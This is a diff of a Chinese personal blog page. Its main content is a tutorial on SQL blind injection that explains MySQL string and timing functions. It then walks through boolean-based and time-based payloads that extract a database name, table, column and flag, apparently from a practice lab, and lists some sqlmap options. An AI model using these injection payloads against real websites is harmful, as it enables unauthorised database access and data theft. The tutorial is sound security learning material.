@@ -34,13 +34,13 @@
   <!-- 页面元数据 -->
   <title>SQL盲注 - Dr4x3zz</title>
   <meta name="keywords" content="SQL注入,null">
-  <meta desc name="description" content="SQL盲注 - Dr4x3zz - Dr4x3zz">
+  <meta desc name="description" content="# SQL 盲注 - Dr4x3zz - Dr4x3zz">
   
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQL盲注">
 <meta property="og:url" content="https://chenzhengkai10.github.io/2022/12/25/SQL%E7%9B%B2%E6%B3%A8/index.html">
 <meta property="og:site_name" content="Dr4x3zz">
-<meta property="og:description" content="SQL盲注">
+<meta property="og:description" content="# SQL 盲注">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
 <meta property="article:published_time" content="2022-12-25T06:37:01.000Z">
@@ -1744,7 +1744,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: "env",
     cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1728903825782),
+    lastupdate: new Date(1728904039860),
     sidebar: {
       for_page: ["blogger","category","tagcloud","donate"],
       for_post: ["toc"],
@@ -2585,92 +2585,178 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    <h1 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h1><span id="more"></span>
-<h2 id="盲注介绍"><a href="#盲注介绍" class="headerlink" title="盲注介绍"></a>盲注介绍</h2><p>在SQL注入过程中，SQL语句执行查询后，查询数据不能回显到前端页面中，我们需要使用一些特殊的方式来判断或尝试，这个过程成为盲注<br>盲注的类型有两种：</p>
-<h3 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h3><pre><code>布尔有很明显的True和Fales，也就是说它只会根据你的诸如信息返回True和False，也就没有了之前的报错信息
+    <h1 id="sql盲注"><a class="markdownIt-Anchor" href="#sql盲注">#</a> SQL 盲注</h1>
+<span id="more"></span>
+<h2 id="盲注介绍"><a class="markdownIt-Anchor" href="#盲注介绍">#</a> 盲注介绍</h2>
+<p>在 SQL 注入过程中，SQL 语句执行查询后，查询数据不能回显到前端页面中，我们需要使用一些特殊的方式来判断或尝试，这个过程成为盲注<br>
+盲注的类型有两种：</p>
+<h3 id="布尔注入"><a class="markdownIt-Anchor" href="#布尔注入">#</a> 布尔注入</h3>
+<pre><code>布尔有很明显的True和Fales，也就是说它只会根据你的诸如信息返回True和False，也就没有了之前的报错信息
 </code></pre>
-<h3 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a>时间注入</h3><pre><code>界面返回值只有一种，True无论输入任何值，返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确
+<h3 id="时间注入"><a class="markdownIt-Anchor" href="#时间注入">#</a> 时间注入</h3>
+<pre><code>界面返回值只有一种，True无论输入任何值，返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确
 </code></pre>
 <p>详细内容会在下面展开说</p>
-<h2 id="需要掌握的几种函数"><a href="#需要掌握的几种函数" class="headerlink" title="需要掌握的几种函数"></a>需要掌握的几种函数</h2><blockquote>
-<p>length() 函数 返回字符串的长度<br>  substr() 截取字符串 （语法:SUBSTR(str,pos,len);）<br>  ascii() 返回字符的ascii码   [将字符变为数字wei]<br>  sleep() 将程序挂起一段时间n为n秒<br>if(expr1,expr2,expr3) 判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</p>
+<h2 id="需要掌握的几种函数"><a class="markdownIt-Anchor" href="#需要掌握的几种函数">#</a> 需要掌握的几种函数</h2>
+<blockquote>
+<p>length () 函数 返回字符串的长度<br>
+ substr () 截取字符串 （语法：SUBSTR (str,pos,len);）<br>
+ascii () 返回字符的 ascii 码   [将字符变为数字 wei]<br>
+ sleep () 将程序挂起一段时间 n 为 n 秒<br>
+ if (expr1,expr2,expr3) 判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</p>
 </blockquote>
-<h3 id="length"><a href="#length" class="headerlink" title="length()"></a>length()</h3><p>这个函数看起来就能理解意思，就是<strong>返回字符串的长度</strong><br>用法就是</p>
+<h3 id="length"><a class="markdownIt-Anchor" href="#length">#</a> length()</h3>
+<p>这个函数看起来就能理解意思，就是<strong>返回字符串的长度</strong><br>
+用法就是</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">length(database()) = 8</span><br></pre></td></tr></table></figure>
-
-<h3 id="substr"><a href="#substr" class="headerlink" title="substr()"></a>substr()</h3><p>这个函数我在sqli-labs-5的时候已经提过，用来<strong>截取字符串</strong>的<br>详细用法可以去看第五关的博客</p>
-<h3 id="ascii"><a href="#ascii" class="headerlink" title="ascii()"></a>ascii()</h3><p>ASCII码应该是很熟悉的，在学C语言的时候就经常使用到，这里是用作<strong>返回字符串的ASCII码</strong><br>用法</p>
+<h3 id="substr"><a class="markdownIt-Anchor" href="#substr">#</a> substr()</h3>
+<p>这个函数我在 sqli-labs-5 的时候已经提过，用来<strong>截取字符串</strong>的<br>
+详细用法可以去看第五关的博客</p>
+<h3 id="ascii"><a class="markdownIt-Anchor" href="#ascii">#</a> ascii()</h3>
+<p>ASCII 码应该是很熟悉的，在学 C 语言的时候就经常使用到，这里是用作<strong>返回字符串的 ASCII 码</strong><br>
+用法</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii() = 117</span><br></pre></td></tr></table></figure>
 <p>有点抽象，第八关的就可以用上</p>
-<h3 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h3><p>通过执行select sleep(n)可以让此语句<strong>执行n秒</strong></p>
+<h3 id="sleep"><a class="markdownIt-Anchor" href="#sleep">#</a> sleep()</h3>
+<p>通过执行 select sleep (n) 可以让此语句<strong>执行 n 秒</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep(n)</span><br></pre></td></tr></table></figure>
-
-<h3 id="if-expr1-expr2-expr3"><a href="#if-expr1-expr2-expr3" class="headerlink" title="if(expr1,expr2,expr3)"></a>if(expr1,expr2,expr3)</h3><p>判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</p>
-<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>我再查找别的网站时发现不仅仅只有上面几个函数，我把刚查阅到的也整理到这里了</p>
-<h4 id="布尔型"><a href="#布尔型" class="headerlink" title="布尔型"></a>布尔型</h4><blockquote>
-<p>left(a,b)从左截取a 的前b位：left(database(),1) &gt; ‘s’<br>  substr(a,b,c)从b位置开始，截取字符串a的c长度<br>  ascii() 将某个字符转换为ascii值：ascii(substr(user),1,1)&#x3D;101#<br>  mid(a,b,c)从位置b开始，截取a字符串的c位 regexp正则表达式的用法<br>user()结果位root ，regexp为匹配root的正则表达式：select user()’</p>
+<h3 id="ifexpr1expr2expr3"><a class="markdownIt-Anchor" href="#ifexpr1expr2expr3">#</a> if(expr1,expr2,expr3)</h3>
+<p>判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</p>
+<h3 id="补充"><a class="markdownIt-Anchor" href="#补充">#</a> 补充</h3>
+<p>我再查找别的网站时发现不仅仅只有上面几个函数，我把刚查阅到的也整理到这里了</p>
+<h4 id="布尔型"><a class="markdownIt-Anchor" href="#布尔型">#</a> 布尔型</h4>
+<blockquote>
+<p>left (a,b) 从左截取 a 的前 b 位：left (database (),1) &gt; ‘s’<br>
+substr (a,b,c) 从 b 位置开始，截取字符串 a 的 c 长度<br>
+ ascii () 将某个字符转换为 ascii 值：ascii (substr (user),1,1)=101#<br>
+mid (a,b,c) 从位置 b 开始，截取 a 字符串的 c 位 regexp 正则表达式的用法<br>
+ user () 结果位 root ，regexp 为匹配 root 的正则表达式：select user ()’</p>
 </blockquote>
-<h5 id="left-a-b-函数"><a href="#left-a-b-函数" class="headerlink" title="left(a,b)函数"></a>left(a,b)函数</h5><blockquote>
-<p>LEFT()函数是一个字符串函数，它返回具有指定长度的字符串的左边部分。<br>  LEFT(str,length)；如果str或length参数为null，则返回null。<br>  str是要提取字符串的字符串、length是一个正整数，指定将从左边返回的字符数。<br>length大于str字符串的长度，则LEFT返回整个str字符串 （返回str的长度，以字节为单位，一个多字节可算作多字节。）</p>
+<h5 id="leftab函数"><a class="markdownIt-Anchor" href="#leftab函数">#</a> left (a,b) 函数</h5>
+<blockquote>
+<p>LEFT () 函数是一个字符串函数，它返回具有指定长度的字符串的左边部分。<br>
+LEFT (str,length)；如果 str 或 length 参数为 null，则返回 null。<br>
+str 是要提取字符串的字符串、length 是一个正整数，指定将从左边返回的字符数。<br>
+length 大于 str 字符串的长度，则 LEFT 返回整个 str 字符串 （返回 str 的长度，以字节为单位，一个多字节可算作多字节。）</p>
 </blockquote>
-<h5 id="substr-或-substring-函数"><a href="#substr-或-substring-函数" class="headerlink" title="substr() 或 substring()函数"></a>substr() 或 substring()函数</h5><blockquote>
-<p>SBUSTR(str,pos)开始的位置，一直截取到最后。<br>  SBUSTR(str，pos，len)；表示从pos开始的位置，截取len个字符(空白也算字符)![在这里插入图片描述<br>SELECT SUBSTRING(‘chinese’,-3); &#x2F;&#x2F;倒数第三个字符之后的子字符串-ese</p>
+<h5 id="substr-或-substring函数"><a class="markdownIt-Anchor" href="#substr-或-substring函数">#</a> substr () 或 substring () 函数</h5>
+<blockquote>
+<p>SBUSTR (str,pos) 开始的位置，一直截取到最后。<br>
+SBUSTR (str，pos，len)；表示从 pos 开始的位置，截取 len 个字符 (空白也算字符)![在这里插入图片描述<br>
+ SELECT SUBSTRING (‘chinese’,-3); // 倒数第三个字符之后的子字符串 - ese</p>
 </blockquote>
-<h5 id="ord-mid-函数"><a href="#ord-mid-函数" class="headerlink" title="ord() mid()函数"></a>ord() mid()函数</h5><blockquote>
-<p>函数ord() 函数返回字符串str的最左面字符的ASCII代码值</p>
+<h5 id="ord-mid函数"><a class="markdownIt-Anchor" href="#ord-mid函数">#</a> ord () mid () 函数</h5>
+<blockquote>
+<p>函数 ord () 函数返回字符串 str 的最左面字符的 ASCII 代码值</p>
 </blockquote>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ord(字符)</span><br></pre></td></tr></table></figure>
 <blockquote>
-<p>函数mid()用于得到字符串的一部分。</p>
+<p>函数 mid () 用于得到字符串的一部分。</p>
 </blockquote>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select mid( &#x27;chinesepeople&#x27;, 5, 3 ) as mid;</span><br><span class="line">//结果:ese</span><br><span class="line">select mid( &#x27;chinesepeople&#x27;, 5) as mid;</span><br><span class="line">//结果:esepeople</span><br></pre></td></tr></table></figure>
-
-<h5 id="cast-和-convert-函数"><a href="#cast-和-convert-函数" class="headerlink" title="cast() 和 convert()函数"></a>cast() 和 convert()函数</h5><p>cast() convert() 函数可用来获取一个类型的值，并生产另一个类型的值。</p>
+<h5 id="cast-和-convert函数"><a class="markdownIt-Anchor" href="#cast-和-convert函数">#</a> cast () 和 convert () 函数</h5>
+<p>cast () convert () 函数可用来获取一个类型的值，并生产另一个类型的值。</p>
 <blockquote>
-<p>可转换的类型 二进制，通带binary前缀的效果：BINARY 字符型，<br>可带参数：char()<br>日期：DATE<br>时间：time<br>日期时间型：datetime<br>浮点型：decimal<br>整数：signen<br>无符号整数：unsignen</p>
+<p>可转换的类型 二进制，通带 binary 前缀的效果：BINARY 字符型，<br>
+可带参数：char ()<br>
+ 日期：DATE<br>
+ 时间：time<br>
+ 日期时间型：datetime<br>
+ 浮点型：decimal<br>
+ 整数：signen<br>
+ 无符号整数：unsignen</p>
 </blockquote>
-<h5 id="ifnull-函数"><a href="#ifnull-函数" class="headerlink" title="ifnull()函数"></a>ifnull()函数</h5><p>IFNULL()意义是当字段A是NULL时取B，不是NULL取A</p>
-<h5 id="sleep-或benchmark"><a href="#sleep-或benchmark" class="headerlink" title="sleep()或benchmark()"></a>sleep()或benchmark()</h5><blockquote>
-<p>通过执行select sleep(n)可以让此语句执行n秒<br>  条件：指定条件的记录存在时才会停止指定的秒数<br>列如：查询条件为name&#x3D;’pig’结果表明记录不存在，执行结果为0</p>
+<h5 id="ifnull函数"><a class="markdownIt-Anchor" href="#ifnull函数">#</a> ifnull () 函数</h5>
+<p>IFNULL () 意义是当字段 A 是 NULL 时取 B，不是 NULL 取 A</p>
+<h5 id="sleep或benchmark"><a class="markdownIt-Anchor" href="#sleep或benchmark">#</a> sleep () 或 benchmark ()</h5>
+<blockquote>
+<p>通过执行 select sleep (n) 可以让此语句执行 n 秒<br>
+条件：指定条件的记录存在时才会停止指定的秒数<br>
+列如：查询条件为 name='pig’结果表明记录不存在，执行结果为 0</p>
 </blockquote>
-<h4 id="时间注入-1"><a href="#时间注入-1" class="headerlink" title="时间注入"></a>时间注入</h4><h5 id="基于时间的盲注在使用延迟函数上可以有两个选择："><a href="#基于时间的盲注在使用延迟函数上可以有两个选择：" class="headerlink" title="基于时间的盲注在使用延迟函数上可以有两个选择："></a>基于时间的盲注在使用延迟函数上可以有两个选择：</h5><blockquote>
-<p>benchmark(count，expr)函数<br>  sleep(time)函数<br>  前者通过将expr语句执行 count次来到达延迟的目的，后者是直接延迟time时间<br>  benchmark是一个内置函数，其作用是来测试一写函数的执行速度，benchmark（）其中有两个参数，<br>第一个是执行次数，另一个是要执行的函数或者表达式。</p>
+<h4 id="时间注入-2"><a class="markdownIt-Anchor" href="#时间注入-2">#</a> 时间注入</h4>
+<h5 id="基于时间的盲注在使用延迟函数上可以有两个选择"><a class="markdownIt-Anchor" href="#基于时间的盲注在使用延迟函数上可以有两个选择">#</a> 基于时间的盲注在使用延迟函数上可以有两个选择：</h5>
+<blockquote>
+<p>benchmark (count，expr) 函数<br>
+ sleep (time) 函数<br>
+前者通过将 expr 语句执行 count 次来到达延迟的目的，后者是直接延迟 time 时间<br>
+ benchmark 是一个内置函数，其作用是来测试一写函数的执行速度，benchmark（）其中有两个参数，<br>
+第一个是执行次数，另一个是要执行的函数或者表达式。</p>
 </blockquote>
-<h5 id="Xpath类型函数-mysql-version-gt-x3D-5-1-5"><a href="#Xpath类型函数-mysql-version-gt-x3D-5-1-5" class="headerlink" title="Xpath类型函数(mysql version &gt;&#x3D; 5.1.5)"></a>Xpath类型函数(mysql version &gt;&#x3D; 5.1.5)</h5><blockquote>
-<p>(1)updatexml() 函数功能：改变文档中符合条件的节点的值。<br>  Updatexml(xml_documnet,XPath_string,new_value)；<br>  第一个参数：XML_document是string格式，为XML文档对象的名称<br>  第二个参数：XPath_string(Xpath格式的字符串)<br>第三个参数：new_value，string格式，替换查找到的符合条件的数据超过长度可以配合substr()</p>
+<h5 id="xpath类型函数mysql-version-515"><a class="markdownIt-Anchor" href="#xpath类型函数mysql-version-515">#</a> Xpath 类型函数 (mysql version&gt;= 5.1.5)</h5>
+<blockquote>
+<p>(1) updatexml () 函数功能：改变文档中符合条件的节点的值。<br>
+Updatexml(xml_documnet,XPath_string,new_value)；<br>
+第一个参数：XML_document 是 string 格式，为 XML 文档对象的名称<br>
+第二个参数：XPath_string (Xpath 格式的字符串)<br>
+ 第三个参数：new_value，string 格式，替换查找到的符合条件的数据超过长度可以配合 substr ()</p>
 </blockquote>
-<h5 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h5><blockquote>
-<p>函数功能:对XML文档进行查询的函数，其实就是相当于HTML文件中标签查找元素。<br>  语法：extractvalue(目标XML文件，XML路径)<br>  第二个参数 xml中位置是可以操作的地方，xml文档中查找字符位置是用 &#x2F;xxx&#x2F;xxx&#x2F;xxx…<br>这种格式，如果写入其他格式，就会报错，并且会返回写入的非法格式内容，而这个非法内容就是号想要查询的内容</p>
+<h5 id="extractvalue"><a class="markdownIt-Anchor" href="#extractvalue">#</a> extractvalue()</h5>
+<blockquote>
+<p>函数功能：对 XML 文档进行查询的函数，其实就是相当于 HTML 文件中标签查找元素。<br>
+语法：extractvalue (目标 XML 文件，XML 路径)<br>
+ 第二个参数 xml 中位置是可以操作的地方，xml 文档中查找字符位置是用 /xxx/xxx/xxx…<br>
+ 这种格式，如果写入其他格式，就会报错，并且会返回写入的非法格式内容，而这个非法内容就是号想要查询的内容</p>
 </blockquote>
-<h2 id="盲注实战"><a href="#盲注实战" class="headerlink" title="盲注实战"></a>盲注实战</h2><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><h4 id="手工注"><a href="#手工注" class="headerlink" title="手工注"></a>手工注</h4><p>1、判断注入点</p>
-<p>and -1&#x3D;-1  页面返回有数据<br>and -1&#x3D;-2  页面无结果返回<br>&#x3D;&#x3D;》存在SQL注入。</p>
+<h2 id="盲注实战"><a class="markdownIt-Anchor" href="#盲注实战">#</a> 盲注实战</h2>
+<h3 id="布尔盲注"><a class="markdownIt-Anchor" href="#布尔盲注">#</a> 布尔盲注</h3>
+<h4 id="手工注"><a class="markdownIt-Anchor" href="#手工注">#</a> 手工注</h4>
+<p>1、判断注入点</p>
+<p>and -1=-1  页面返回有数据<br>
+ and -1=-2  页面无结果返回<br>
+ ==》存在 SQL 注入。</p>
 <p>2、判断当前页面字段总数</p>
-<p>and -1&#x3D;-1 order by 2 页面返回有数据<br>and -1&#x3D;-2 order by 3 页面无结果返回<br>&#x3D;&#x3D;》当前页面字段数为：2。</p>
+<p>and -1=-1 order by 2 页面返回有数据<br>
+ and -1=-2 order by 3 页面无结果返回<br>
+ ==》当前页面字段数为：2。</p>
 <p>3、判断显示位</p>
-<p>and -1&#x3D;-2 union select 1,2 页面无结果返回<br>&#x3D;&#x3D;》无回显点，应该是：盲注并且是布尔盲注（有明显的True和Flash）。</p>
+<p>and -1=-2 union select 1,2 页面无结果返回<br>
+ ==》无回显点，应该是：盲注并且是布尔盲注（有明显的 True 和 Flash）。</p>
 <p>4、猜解当前数据库名称长度</p>
-<p>and (length(database()))&gt;11页面返回有数据<br>and (length(database()))&gt;12页面无结果返回<br>&#x3D;&#x3D;》当前数据库名称长度为：12。</p>
-<p>5、用ASCII码猜解当前数据库名称</p>
-<p>and ascii(substr(database(),1,1))&#x3D;107 页面返回有数据<br>and ascii(substr(database(),2,1))&#x3D;97 页面返回有数据<br>&#x3D;&#x3D;》当前数据库 第一个字母是k,第二个字母是a…以此类推得到数据库库名是kanwolonxia。</p>
-<p>注：判断ascii码范围不止是 ”&#x3D;” 哦,还应该恰当使用 “&gt;”,“&lt;” 等符号。</p>
+<p>and (length (database ()))&gt;11 页面返回有数据<br>
+ and (length (database ()))&gt;12 页面无结果返回<br>
+ ==》当前数据库名称长度为：12。</p>
+<p>5、用 ASCII 码猜解当前数据库名称</p>
+<p>and ascii (substr (database (),1,1))=107 页面返回有数据<br>
+ and ascii (substr (database (),2,1))=97 页面返回有数据<br>
+ ==》当前数据库 第一个字母是 k, 第二个字母是 a… 以此类推得到数据库库名是 kanwolonxia。</p>
+<p>注：判断 ascii 码范围不止是 ”=&quot; 哦，还应该恰当使用 “&gt;”,“&lt;” 等符号。</p>
 <p>6、猜表名</p>
-<p>and (ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1)))&#x3D;108  页面返回有数据<br>&#x3D;&#x3D;》表名的 第一个字母是 l …然后以此类推得到 表名 loflag。</p>
+<p>and (ascii (substr ((select table_name from information_schema.tables where table_schema=database () limit 0,1),1,1)))=108  页面返回有数据<br>
+ ==》表名的 第一个字母是 l … 然后以此类推得到 表名 loflag。</p>
 <p>7、猜字段名</p>
-<p>and (ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’loflag’ limit 1,1),1,1)))&#x3D;102   页面返回有数据<br>&#x3D;&#x3D;》字段名的第一个字母是 f…类推得到字段名 flaglo。</p>
-<p>8、猜内容 </p>
-<p>and (ascii(substr(( select flaglo from loflag limit 0,1),1,1)))&#x3D;122  页面返回有数据<br>&#x3D;&#x3D;》得到数据的第一个字母是 z…类推得到 数据zKaQ-QQQ</p>
-<h4 id="burp跑盲注"><a href="#burp跑盲注" class="headerlink" title="burp跑盲注"></a>burp跑盲注</h4><h4 id="sqlmap跑布尔盲注"><a href="#sqlmap跑布尔盲注" class="headerlink" title="sqlmap跑布尔盲注"></a>sqlmap跑布尔盲注</h4><p>基础命令：</p>
-<p>-u 指定注入点<br>–dbs 跑库名<br>–tables 跑表名<br>–columns 跑字段名<br>–dump 枚举数据</p>
+<p>and (ascii (substr ((select column_name from information_schema.columns where table_name=‘loflag’ limit 1,1),1,1)))=102   页面返回有数据<br>
+ ==》字段名的第一个字母是 f… 类推得到字段名 flaglo。</p>
+<p>8、猜内容</p>
+<p>and (ascii (substr (( select flaglo from loflag limit 0,1),1,1)))=122  页面返回有数据<br>
+ ==》得到数据的第一个字母是 z… 类推得到 数据 zKaQ-QQQ</p>
+<h4 id="burp跑盲注"><a class="markdownIt-Anchor" href="#burp跑盲注">#</a> burp 跑盲注</h4>
+<h4 id="sqlmap跑布尔盲注"><a class="markdownIt-Anchor" href="#sqlmap跑布尔盲注">#</a> sqlmap 跑布尔盲注</h4>
+<p>基础命令：</p>
+<p>-u 指定注入点<br>
+–dbs 跑库名<br>
+–tables 跑表名<br>
+–columns 跑字段名<br>
+–dump 枚举数据</p>
 <p>-D 指定库 -T 指定表 -C 指定字段</p>
 <p>这两种盲注还需要学习一下，后续在做归纳</p>
-<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>1、判断注入点</p>
-<p>“and -1&#x3D;-1– w  页面返回有数据<br>“and -1&#x3D;-2– w  页面返回有数据<br>&#x3D;&#x3D;》页面的返回没有变化，可能是盲注；<br>然后用sleep()判断是否是时间盲注<br>“and sleep(5)– w    页面延时了<br>&#x3D;&#x3D;》该盲注是时间盲注。</p>
+<h3 id="时间盲注"><a class="markdownIt-Anchor" href="#时间盲注">#</a> 时间盲注</h3>
+<p>1、判断注入点</p>
+<p>&quot;and -1=-1-- w  页面返回有数据<br>
+ &quot;and -1=-2-- w  页面返回有数据<br>
+ ==》页面的返回没有变化，可能是盲注；<br>
+然后用 sleep () 判断是否是时间盲注<br>
+ &quot;and sleep (5)-- w    页面延时了<br>
+ ==》该盲注是时间盲注。</p>
 <p>2、猜解当前数据库名称长度</p>
-<p>“and if((length(database()))&#x3D;12,sleep(5),1)– w  页面延时了<br>&#x3D;&#x3D;》当前数据库名称长度为 12。</p>
-<p>3、用ASCII码猜解当前数据库名称</p>
-<p>“and if(ascii(substr(database(),1,1))&#x3D;107,sleep(5),1)– w  页面延时了<br>&#x3D;&#x3D;》数据库第一个字母是k… 类推得到数据库名kanwolonxia。<br>后面的跟上面的差不多就是多了一个 if() 函数。</p>
-<p>并且用Burp和Salmap的方法也都类似。</p>
-<p>延时盲注其实和布尔盲注其实没有什么太大的区别，只不过是一个依靠页面是否正常判断，一个是否延时判断，在操作上其实也差不多，只不过延时多一个if()。</p>
+<p>&quot;and if ((length (database ()))=12,sleep (5),1)-- w  页面延时了<br>
+ ==》当前数据库名称长度为 12。</p>
+<p>3、用 ASCII 码猜解当前数据库名称</p>
+<p>&quot;and if (ascii (substr (database (),1,1))=107,sleep (5),1)-- w  页面延时了<br>
+ ==》数据库第一个字母是 k… 类推得到数据库名 kanwolonxia。<br>
+后面的跟上面的差不多就是多了一个 if () 函数。</p>
+<p>并且用 Burp 和 Salmap 的方法也都类似。</p>
+<p>延时盲注其实和布尔盲注其实没有什么太大的区别，只不过是一个依靠页面是否正常判断，一个是否延时判断，在操作上其实也差不多，只不过延时多一个 if ()。</p>
 
   </div>
   
@@ -2721,7 +2807,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://chenzhengkai10.github.io/2022/12/25/SQL%E7%9B%B2%E6%B3%A8/&title=SQL盲注 - Dr4x3zz&summary=SQL盲注"
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://chenzhengkai10.github.io/2022/12/25/SQL%E7%9B%B2%E6%B3%A8/&title=SQL盲注 - Dr4x3zz&summary=# SQL 盲注"
           
           >
           
@@ -2733,7 +2819,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://chenzhengkai10.github.io/2022/12/25/SQL%E7%9B%B2%E6%B3%A8/&title=SQL盲注 - Dr4x3zz&summary=SQL盲注"
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://chenzhengkai10.github.io/2022/12/25/SQL%E7%9B%B2%E6%B3%A8/&title=SQL盲注 - Dr4x3zz&summary=# SQL 盲注"
           
           >
           
@@ -2745,7 +2831,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=https://chenzhengkai10.github.io/2022/12/25/SQL%E7%9B%B2%E6%B3%A8/&title=SQL盲注 - Dr4x3zz&summary=SQL盲注"
+          target="_blank" href="http://service.weibo.com/share/share.php?url=https://chenzhengkai10.github.io/2022/12/25/SQL%E7%9B%B2%E6%B3%A8/&title=SQL盲注 - Dr4x3zz&summary=# SQL 盲注"
           
           >
           
@@ -2780,23 +2866,26 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class='prev' href='/2023/01/06/sqli-labs-9-10/'>
           <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>sqli-labs-9-10</p>
-          <p class='content'>sqli-labs-9-10
+          <p class='content'># sqli-labs-9-10
 
-sqli-labs-9输入正确的id
+# sqli-labs-9
+输入正确的 id
 1url?id=1
-
-页面显示You are in……
+页面显示 You are in…
 无回显
-我们现在id&#x3D;1后面加个单引号’，”,’),”)
-...</p>
+我们现在 id=1 后面加个单引号’，&quot;...</p>
         </a>
       
       
         <a class='next' href='/2022/12/24/php%E5%AD%A6%E4%B9%A02022-12-24/'>
           <p class='title'>php学习2022-12-24<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>php学习(array)
-数值数组数组自动分配ID第一种方法是自动分配ID键，和C语言一样都是从0开始分配ID代码如下：
-12345&lt;?php    $color = array( &qu...</p>
+          <p class='content'># php 学习 (array)
+
+# 数值数组数组
+# 自动分配 ID
+第一种方法是自动分配 ID 键，和 C 语言一样都是从 0 开始分配 ID
+ 代码如下：
+12345&lt;?php  ...</p>
         </a>
       
     </div>
@@ -2854,7 +2943,7 @@ sqli-labs-9输入正确的id
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8%E4%BB%8B%E7%BB%8D"><span class="toc-text">盲注介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5"><span class="toc-text">布尔注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5"><span class="toc-text">时间注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9C%80%E8%A6%81%E6%8E%8C%E6%8F%A1%E7%9A%84%E5%87%A0%E7%A7%8D%E5%87%BD%E6%95%B0"><span class="toc-text">需要掌握的几种函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#length"><span class="toc-text">length()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#substr"><span class="toc-text">substr()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ascii"><span class="toc-text">ascii()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sleep"><span class="toc-text">sleep()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#if-expr1-expr2-expr3"><span class="toc-text">if(expr1,expr2,expr3)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-text">补充</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E5%9E%8B"><span 